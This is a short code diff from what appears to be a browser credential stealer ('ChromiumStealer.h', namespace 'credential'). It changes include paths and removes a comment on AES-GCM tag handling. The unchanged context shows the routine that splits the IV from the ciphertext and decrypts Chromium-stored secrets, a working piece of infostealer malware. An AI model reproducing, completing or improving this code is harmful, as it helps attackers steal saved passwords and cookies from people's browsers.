@@ -9,8 +9,8 @@
 #include "ChromiumStealer.h"
 #include "../crypto/Base64.h"
 #include "../crypto/AesGcm.h"
-#include "../external/nlohmann/json.hpp"
-#include "../external/sqlite3/sqlite3.h"
+#include <nlohmann/json.hpp>
+#include <sqlite3.h>
 
 #pragma comment(lib, "crypt32.lib")
 
@@ -58,12 +58,6 @@ namespace credential {
 
                 std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
                 std::vector<BYTE> encryptedData(ciphertext.begin() + 15, ciphertext.end() - 16); // Data without tag
-                // Note: AesGcm::decrypt expects ciphertext + tag combined for BCrypt if using valid implementation, 
-                // BUT the Windows BCrypt GCM implementation often takes Tag separately or appended.
-                // Our AesGcm::decrypt implementation:
-                // std::vector<BYTE> encryptedData(ciphertext.begin(), ciphertext.end() - 16);
-                // std::vector<BYTE> tag(ciphertext.end() - 16, ciphertext.end());
-                // So pass (EncryptedData + Tag)
                 
                 std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());
 
